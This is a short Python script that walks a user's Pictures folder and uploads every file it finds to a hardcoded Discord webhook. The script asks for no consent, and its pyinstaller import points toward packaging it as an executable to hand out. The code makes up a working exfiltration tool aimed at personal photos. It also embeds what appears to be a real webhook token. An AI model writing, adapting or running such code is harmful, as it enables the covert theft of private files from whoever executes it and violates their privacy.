import os
import pyinstaller
import requests

# Your Discord Webhook URL here
WEBHOOK_URL = 'https://discord.com/api/webhooks/1285668353175715994/_WlqDeiKePnyAHf-yZtA9RMi4-d_CenYAH7PyVz0SZauPpJmL_sl1dDmOW2ojuMNCbCg'

# Path to the Pictures directory (customize as needed)
PICTURES_PATH = os.path.expanduser("~/Pictures")

# Function to send a file to the Discord webhook
def send_file_to_discord(file_path):
    file_name = os.path.basename(file_path)
    with open(file_path, 'rb') as file_data:
        # Prepare the payload with the file
        payload = {
            'content': f'Uploading file: {file_name}',
        }
        # Sending file using multipart/form-data
        files = {
            'file': (file_name, file_data),
        }
        try:
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            if response.status_code == 204:
                print(f"Successfully uploaded {file_name} to Discord.")
            else:
                print(f"Failed to upload {file_name}. Status Code: {response.status_code}")
        except Exception as e:
            print(f"An error occurred: {e}")

# Iterate through all files in the Pictures directory and send them to the webhook
def upload_pictures_to_discord():
    if not os.path.exists(PICTURES_PATH):
        print(f"Directory {PICTURES_PATH} does not exist.")
        return

    for root, dirs, files in os.walk(PICTURES_PATH):
        for file in files:
            file_path = os.path.join(root, file)
            send_file_to_discord(file_path)

if __name__ == "__main__":
    upload_pictures_to_discord()
